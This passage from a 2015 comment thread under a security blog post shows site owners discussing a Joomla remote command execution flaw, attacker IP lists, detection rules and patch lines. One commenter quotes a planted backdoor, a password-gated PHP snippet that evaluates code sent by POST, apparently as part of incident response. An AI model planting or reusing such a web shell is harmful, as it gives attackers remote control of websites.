	<ul class="children">

	<li class="comment even depth-3" id="comment-7147">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/9946c075ed5976a4373a2ecf6c76d67d?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/9946c075ed5976a4373a2ecf6c76d67d?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">kolydart</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T20:04:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7147">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thank you. Do you know if the exploit allowed interaction with the DataBase? In that case, I guess we should also search in the data, which makes cleaning much harder..<br />
I noticed in the log, terms like JFactory::getConfig() indicating the intruders had access to site credentials.<br />
Also, I found a file planted by the intruders in the following path: /libraries/joomla/exporter.php<br />
The file contained the following:  if (md5($_POST[&#8216;password&#8217;]) == &#8216;cacf9427ffc71edf7565bd43383c71c7&#8217;) { preg_replace(&#8220;43565243145&#8243;, &#8221;<br />
14516614115450142141163145666413714414514315714414550&#8242;&#8221; . $_POST[&#8216;code&#8217;] . &#8220;&#8216;515173&#8243;, &#8221;); } </p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-4" id="comment-7156">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/c77eb506b7bf0e494439dbf459e41d87?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/c77eb506b7bf0e494439dbf459e41d87?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Els</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-17T14:47:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7156">December 17, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I have the opposite problem. Had a database backup from barely a week ago, so reuploaded that one. (no changes in the last week). But now to go through all the files to see if they were changed in the last week (or find the &#8220;latest&#8221; file backup two harddisks ago&#8230;)</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even depth-3" id="comment-7157">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/c77eb506b7bf0e494439dbf459e41d87?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/c77eb506b7bf0e494439dbf459e41d87?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Els</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-17T14:50:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7157">December 17, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks, I&#8217;ll go the diff route, once I&#8217;ve dug up my last full backup.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-7089">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/978d965162938ce8f9b3831410a38253?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/978d965162938ce8f9b3831410a38253?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">WooDzu</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T09:16:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7089">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Serializing PHP is evil, should do dump to json and load from json instead. There will always be holes like that, one way or another.</p>
<p>Thanks for the detection instructions! All clear here.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-7090">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/eb8da0cd2557d5535a041b52b1c4486e?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/eb8da0cd2557d5535a041b52b1c4486e?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Ea1Y</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T09:45:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7090">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>does someone has logs or an ossec rules ? thanks</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7127">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T15:57:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7127">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>OSSEC rules here:</p>
<p><a href="https://bitbucket.org/dcid/ossec-hids/commits/67696e5691127a47adba1be83826e3f73bdcea75" rel="nofollow ugc">https://bitbucket.org/dcid/ossec-hids/commits/67696e5691127a47adba1be83826e3f73bdcea75</a></p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-3" id="comment-7130">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/eb8da0cd2557d5535a041b52b1c4486e?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/eb8da0cd2557d5535a041b52b1c4486e?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Ea1Y</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T15:59:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7130">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>thanks</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-7091">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/de9169c6c2cc9a4924a347c84a7d2d5b?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/de9169c6c2cc9a4924a347c84a7d2d5b?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Joomlabugs</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T09:48:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7091">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Morning! </p>
<p>For update the Joomla only can extract the tarball of Joomla_3.4.5_to_3.4.6 in the root directory of www?</p>
<p>Thanks.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-7095">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/6bbc2496baa74a39f5b2fefdb1afceb2?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/6bbc2496baa74a39f5b2fefdb1afceb2?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Jovan Style</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T11:17:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7095">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>if joomla is installed in windows, what would be the impact?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7098">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T14:33:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7098">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>That&#8217;s the same. They will be able to execute commands via PHP.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7100">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f1913e6bf85372dc9a308b68679d49d6?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f1913e6bf85372dc9a308b68679d49d6?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://subs.gr" class="comment-author-link" rel="external nofollow" itemprop="url">Alexandros A.</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T14:42:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7100">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I did a log analysis in more that 200 servers so here are some more IPs :</p>
<p>5.135.158.101<br />
5.196.1.129<br />
5.196.72.199<br />
5.196.72.207<br />
5.79.68.161<br />
5.9.36.66<br />
31.220.45.6<br />
35.0.127.52<br />
37.130.227.133<br />
37.187.129.166<br />
37.48.80.101<br />
37.48.80.73<br />
37.48.81.27<br />
46.165.230.5<br />
46.183.221.231<br />
46.45.137.71<br />
51.255.38.230<br />
51.255.38.231<br />
62.102.148.67<br />
62.210.105.116<br />
62.210.37.82<br />
64.27.17.140<br />
71.19.248.195<br />
71.19.248.201<br />
71.19.248.46<br />
77.244.254.230<br />
77.247.178.245<br />
77.247.181.163<br />
77.247.181.165<br />
77.51.138.131<br />
79.172.193.32<br />
80.82.64.129<br />
81.7.16.13<br />
82.174.117.44<br />
83.233.119.138<br />
85.10.210.199<br />
85.214.98.239<br />
85.245.242.72<br />
85.25.103.119<br />
85.25.44.141<br />
85.93.218.204<br />
88.198.14.171<br />
89.144.10.210<br />
89.187.142.208<br />
89.234.157.254<br />
89.248.160.156<br />
89.248.167.141<br />
89.73.177.236<br />
91.203.5.165<br />
91.213.8.236<br />
91.233.117.159<br />
91.234.22.48<br />
91.240.67.138<br />
91.250.241.241<br />
93.115.95.201<br />
93.115.95.205<br />
93.115.95.206<br />
93.115.95.207<br />
93.174.90.30<br />
93.184.66.227<br />
94.142.242.84<br />
94.242.228.108<br />
94.242.246.24<br />
94.242.253.92<br />
94.30.181.134<br />
95.130.13.157<br />
95.69.233.211<br />
104.156.228.165<br />
104.200.78.157<br />
104.238.169.40<br />
109.163.234.2<br />
109.163.234.4<br />
109.163.234.5<br />
109.163.234.7<br />
109.163.234.9<br />
109.194.217.99<br />
109.201.133.100<br />
109.201.143.40<br />
109.201.152.13<br />
142.4.213.25<br />
142.54.171.124<br />
146.90.84.210<br />
149.126.76.97<br />
149.202.42.188<br />
149.202.98.160<br />
149.202.98.161<br />
149.210.233.129<br />
151.80.138.19<br />
151.80.175.238<br />
151.80.37.117<br />
158.69.172.227<br />
158.69.192.220<br />
158.69.214.254<br />
158.69.215.68<br />
158.69.215.7<br />
162.221.200.51<br />
162.247.72.202<br />
162.247.72.212<br />
162.247.72.27<br />
167.114.204.255<br />
167.114.89.196<br />
171.25.193.131<br />
171.25.193.132<br />
171.25.193.25<br />
173.255.229.8<br />
176.10.104.240<br />
176.10.104.243<br />
176.56.230.162<br />
178.162.216.42<br />
178.254.18.100<br />
178.32.53.53<br />
185.100.85.61<br />
185.101.107.189<br />
185.104.120.2<br />
185.17.184.228<br />
185.65.135.227<br />
188.27.107.37<br />
188.68.229.144<br />
192.42.116.16<br />
193.107.85.62<br />
193.171.202.150<br />
193.90.12.86<br />
194.150.168.79<br />
194.150.168.95<br />
194.28.174.106<br />
194.28.174.117<br />
195.154.56.44<br />
195.154.69.88<br />
195.19.194.108<br />
195.22.126.119<br />
198.50.145.72<br />
198.51.75.165<br />
204.194.29.4<br />
204.85.191.30<br />
212.117.180.21<br />
212.21.66.6<br />
212.47.238.193<br />
212.47.246.21<br />
213.126.78.59<br />
213.61.149.100<br />
217.115.10.133</p>
<p>good luck to all</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-7107">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/419da74a42ba3c1bca39a008db8b0e4b?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/419da74a42ba3c1bca39a008db8b0e4b?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Mike</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-15T19:17:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7107">December 15, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Do you have any modsecurity rule for blocking session.php 0day exploit?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7112">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/e2ffe24ed660754686b36f15451842f4?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/e2ffe24ed660754686b36f15451842f4?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.slickrockweb.com" class="comment-author-link" rel="external nofollow" itemprop="url">Eric Nelson</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T03:19:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7112">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Daniel any idea on how long you think this exploit has been known? The exploit itself seems reasonably clever but the execution and final payload, at least what has been happening for the past few days, seems somewhat clunky and amateurish. It is as if the exploit was known by someone else and maybe sold to spammers. I have not seen many pre-existing rules or filters that would have caught at least the initial exploit.  The second step of posting the payload seems to be where much of this got stopped. That is where our WAFs stopped it for our clients and I am sure the same was true for Sucuri clients &#8230; and maybe you guys caught it at the User Agent step. But I fear this one will be felt for a while across the internet &#8230;. because we all know only a small percentage of sites have been patched in the last 24 hrs. And my gut is telling me that the person or group who figured out this exploit is not the same people doing this wave of attacks that presumably started a few days ago.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7126">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T15:56:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7126">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>The first traces of the attack started 2 days before the disclosure. We could not find any more attempts going back a while in our logs. And yes, we were able to block it due to our pre-existing rules to filter the user-agent and x-forwarded-for headers. </p>
<p>As far as the scope, I am seeing a lot of sites hacked already and still a LOT of unpatched sites out there. </p>
<p>thanks,</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-7115">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/471b09c53c17cba8c6f9768ac4ef59cd?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/471b09c53c17cba8c6f9768ac4ef59cd?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">anamaria1980</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T11:51:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7115">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>On one of my sites I have hacked some core files to disable writing session info in sessions table, except for sessions of the administrator side of joomla. Would that accidentally protect me from this attack?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7132">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Phil Taylor, The Joomla Expert</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T16:02:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7132">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>The session data has to be stored somewhere &#8211; so no &#8211; that would not protect you.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7116">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/522c0b6796533143ca0bdf93b0834391?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/522c0b6796533143ca0bdf93b0834391?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">ronald</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T14:18:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7116">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Is joomla not working correct anymore do we have to switch to wordpress?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-7117">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/522c0b6796533143ca0bdf93b0834391?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/522c0b6796533143ca0bdf93b0834391?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">ronald</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T14:21:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7117">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Our hosting company doesn&#8217;t accept joomla because of the Security issues. Is this justified?<br />
Is joomla not working correct anymore do we have to switch to wordpress?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-2" id="comment-7125">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/df3ec5506ba59d2ed3b951b7057e97d0?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://dcid.me" class="comment-author-link" rel="external nofollow" itemprop="url">Daniel Cid</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T15:52:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7125">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Not at all. Every CMS will have security vulnerabilities and as long as you keep it patched and follow good security practices, you will be ok. </p>
<p>Remember, every code has vulnerabilities. The security of your site should not be dependent on having a flawless code. That&#8217;s why we preach security/defense in depth and taking extra security measures so 1 failure doesn&#8217;t equal to full compromise.</p>
<p>thanks!</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt depth-2" id="comment-7128">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Phil Taylor</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T15:57:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7128">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Care to name your incompetent foolish web host?</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment even depth-3" id="comment-7149">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/6e62addf18eade1227f3c78b4c4ed534?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/6e62addf18eade1227f3c78b4c4ed534?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://perezbox.com/" class="comment-author-link" rel="external nofollow" itemprop="url">Tony Perez</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T20:26:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7149">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Hey @prazgod:disqus </p>
<p>There isn&#8217;t a need for these types of responses. There are ways to be more tactful in your engagement. </p>
<p>Tony</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-4" id="comment-7152">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/4c7eec676a9b4662214e9198afa29acb?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Phil Taylor, The Joomla Expert</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T20:30:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7152">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Whatever. A webhost refusing to host joomla on security grounds is incompetent and foolish. If you dont care for my honest engagement then block me from your site &#8211; I honestly could not care less. There is so much disinformation in the comments in your posts anyway &#8211; and more to this vulnerability that you dont know and will come to light this week&#8230; much&#8230; much more&#8230;</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even depth-2" id="comment-7135">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/6fca3ebd211f18de1c7513565b9e377f?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/6fca3ebd211f18de1c7513565b9e377f?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Alan Langford</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T16:22:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7135">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>WordPress has had multiple security issues as well. A good host needs to implement defenses against vulnerabilities in anything that involves code, be that PHP, Python, Ruby, Java or anything else. If your host thinks that banning Joomla is going to solve their security issues, then they&#8217;re delusional.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment odd alt thread-even depth-1" id="comment-7118">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/f85fd9a270f68cc9a7dc08eeb80dd03c?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/f85fd9a270f68cc9a7dc08eeb80dd03c?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Dukes909</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T14:38:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7118">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I already patched my site but reading through the comments here and then going through my install I&#8217;ve found files modified: includes/defines.php has this:</p>
<p>if(strpos(implode($_SERVER),&#8221;O:&#8221;)){exit;}</p>
<p>which is easy enough to fix but how do I find all the other files (if any, and I presume there are) that have been modified.  BTW, this file had a timestamp of Sept. 8, 2015.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-odd thread-alt depth-1" id="comment-7120">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/3b0a5563f0cc4d0c2a4a6f532388c97b?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/3b0a5563f0cc4d0c2a4a6f532388c97b?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Pat</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T15:31:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7120">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>The patches for 1.5.x and 2.5.x do not fix the issue, they leave the vaunerability accessable via HTTP_X_FORWARDED_FOR</p>
<p>The 3.x patch that went in, also correct this other entry point.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7133">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/e2ffe24ed660754686b36f15451842f4?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/e2ffe24ed660754686b36f15451842f4?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://www.slickrockweb.com" class="comment-author-link" rel="external nofollow" itemprop="url">Eric Nelson</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2015-12-16T16:04:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7133">December 16, 2015</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Not sure which patch you ended up getting. I saw two different ones, but the one that has this line below in it and the one we used should protect 1.5.x and 2.5.x going forward.</p>
<p>if(!empty($xForwardedFor) &amp;&amp; filter_var($xForwardedFor, FILTER_VALIDATE_IP) !== false)</p>
